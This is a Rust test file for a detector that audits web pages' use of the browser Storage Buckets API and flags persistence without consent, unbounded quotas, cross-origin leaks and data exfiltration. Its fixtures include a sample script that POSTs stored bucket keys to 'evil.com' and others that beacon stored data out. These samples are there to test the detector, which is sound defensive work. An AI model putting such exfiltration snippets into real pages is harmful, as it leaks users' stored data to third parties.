use crate::storage_bucket_audit::*;

#[test]
fn test_no_api_returns_empty() {
    let body = "<html><body>Regular content</body></html>";
    assert_eq!(analyze_storage_bucket(body), Vec::new());
}

#[test]
fn test_api_detected_storage_buckets() {
    let body = r#"<script>const x = navigator.storageBuckets;</script>"#;
    let issues = analyze_storage_bucket(body);
    assert_eq!(issues, vec![StorageBucketIssue::ApiDetected]);
}

#[test]
fn test_api_detected_storage_bucket_class() {
    let body = r#"
        <script>
        class StorageBucket {
            constructor(name) { this.name = name; }
        }
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert_eq!(issues, vec![StorageBucketIssue::ApiDetected]);
}

#[test]
fn test_persistent_storage_without_consent() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('docs');
        if (await bucket.persisted()) {
            console.log('Data will persist');
        }
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert!(issues.contains(&StorageBucketIssue::ApiDetected));
    assert!(issues.contains(&StorageBucketIssue::PersistentStorage));
}

#[test]
fn test_persistent_storage_with_consent_ok() {
    let body = r#"
        <script>
        if (Notification.permission === 'granted') {
            const bucket = navigator.storageBuckets;
            await bucket.persist();
        }
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert!(issues.contains(&StorageBucketIssue::ApiDetected));
    assert!(!issues.contains(&StorageBucketIssue::PersistentStorage));
}

#[test]
fn test_unbounded_quota() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('cache');
        const estimate = await bucket.quota;
        console.log('Usage:', estimate.usage);
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert!(issues.contains(&StorageBucketIssue::ApiDetected));
    assert!(issues.contains(&StorageBucketIssue::UnboundedQuota));
}

#[test]
fn test_quota_with_limit_ok() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('cache', {
            quota: 1024 * 1024 * 100
        });
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert_eq!(issues, vec![StorageBucketIssue::ApiDetected]);
}

#[test]
fn test_cross_origin_leak() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('shared');
        const db = await bucket.indexedDB.open('mydb');
        worker.postMessage({ bucketName: 'shared', data: records });
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert!(issues.contains(&StorageBucketIssue::ApiDetected));
    assert!(issues.contains(&StorageBucketIssue::CrossOriginLeak));
}

#[test]
fn test_cross_origin_leak_with_caches() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('assets');
        const cache = await bucket.caches.open('v1');
        const channel = new BroadcastChannel('storage-updates');
        channel.postMessage({ bucket: 'assets' });
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert!(issues.contains(&StorageBucketIssue::CrossOriginLeak));
}

#[test]
fn test_data_exfiltration() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('user-data');
        const keys = await bucket.keys();
        fetch('https://evil.com/collect', {
            method: 'POST',
            body: JSON.stringify(keys)
        });
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert!(issues.contains(&StorageBucketIssue::ApiDetected));
    assert!(issues.contains(&StorageBucketIssue::DataExfiltration));
}

#[test]
fn test_data_exfiltration_with_send_beacon() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('analytics');
        const entries = await bucket.getAll();
        navigator.sendBeacon('/track', JSON.stringify(entries));
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert!(issues.contains(&StorageBucketIssue::DataExfiltration));
}

#[test]
fn test_multiple_issues() {
    let body = r#"
        <script>
        const bucket = await navigator.storageBuckets.open('data');
        await bucket.persist();
        const db = await bucket.indexedDB.open('db');
        const records = await db.getAll();
        fetch('https://analytics.example.com/collect', {
            method: 'POST',
            body: JSON.stringify(records)
        });
        window.postMessage({ type: 'data-ready' }, '*');
        </script>
    "#;
    let issues = analyze_storage_bucket(body);
    assert!(issues.contains(&StorageBucketIssue::ApiDetected));
    assert!(issues.contains(&StorageBucketIssue::PersistentStorage));
    assert!(issues.contains(&StorageBucketIssue::CrossOriginLeak));
    assert!(issues.contains(&StorageBucketIssue::DataExfiltration));
    assert_eq!(issues.len(), 5);
}

#[test]
fn test_display_formatting() {
    assert_eq!(StorageBucketIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(
        StorageBucketIssue::PersistentStorage.to_string(),
        "persistent_storage"
    );
    assert_eq!(
        StorageBucketIssue::UnboundedQuota.to_string(),
        "unbounded_quota"
    );
    assert_eq!(
        StorageBucketIssue::CrossOriginLeak.to_string(),
        "cross_origin_leak"
    );
    assert_eq!(
        StorageBucketIssue::DataExfiltration.to_string(),
        "data_exfiltration"
    );
}

#[test]
fn test_severity_scores() {
    assert_eq!(
        storage_bucket_severity(&StorageBucketIssue::ApiDetected),
        2.0
    );
    assert_eq!(
        storage_bucket_severity(&StorageBucketIssue::PersistentStorage),
        6.5
    );
    assert_eq!(
        storage_bucket_severity(&StorageBucketIssue::UnboundedQuota),
        6.0
    );
    assert_eq!(
        storage_bucket_severity(&StorageBucketIssue::CrossOriginLeak),
        7.0
    );
    assert_eq!(
        storage_bucket_severity(&StorageBucketIssue::DataExfiltration),
        7.5
    );
}

#[test]
fn test_to_operations() {
    let issues = vec![
        StorageBucketIssue::ApiDetected,
        StorageBucketIssue::DataExfiltration,
    ];
    let mut seq = 100;
    let ops = storage_bucket_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 102);
}

#[test]
fn test_case_sensitive_detection() {
    let body_lower = "const bucket = await navigator.storagebuckets;";
    assert_eq!(analyze_storage_bucket(body_lower), Vec::new());

    let body_correct = "const x = navigator.storageBuckets;";
    assert_eq!(
        analyze_storage_bucket(body_correct),
        vec![StorageBucketIssue::ApiDetected]
    );
}
